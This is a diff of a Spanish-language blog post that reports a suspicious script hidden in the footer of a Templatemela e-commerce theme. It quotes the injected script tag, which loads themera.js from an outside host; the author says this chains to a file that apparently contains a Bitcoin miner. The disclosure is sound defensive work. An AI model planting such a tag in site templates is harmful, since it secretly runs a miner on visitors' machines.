@@ -5,7 +5,7 @@ Trabajando junto con un amigo en un eCommerce, fuí alertado de la existencia de
 
 Había un par scripts que tenían un comportamiento extraño por decir lo menos. El primero, "themera.js" llamaba a una página "https://themera.net/", la llamada estaba en el footer.php del Template elaborado por la empresa Templatemela. Concretamente en la plantilla Adorsy.
 
-<!-- <script type="text/javascript" src="//themera.net/embed/themera.js?id=76847"></script> -->
+`<script type="text/javascript" src="//themera.net/embed/themera.js?id=76847"></script>`
 
 Dentro de ese script se llamaba a otro "counter.js", este último alojado en una web de Países Bajos "https://cleverjump.org/", al parecer había un Bitcoin Minner ese último script. https://urlscan.io/result/8f13ff7e-23f9-47dd-a8bb-c66eb2a76118 dejo los resultados de mi búsqueda. 
 
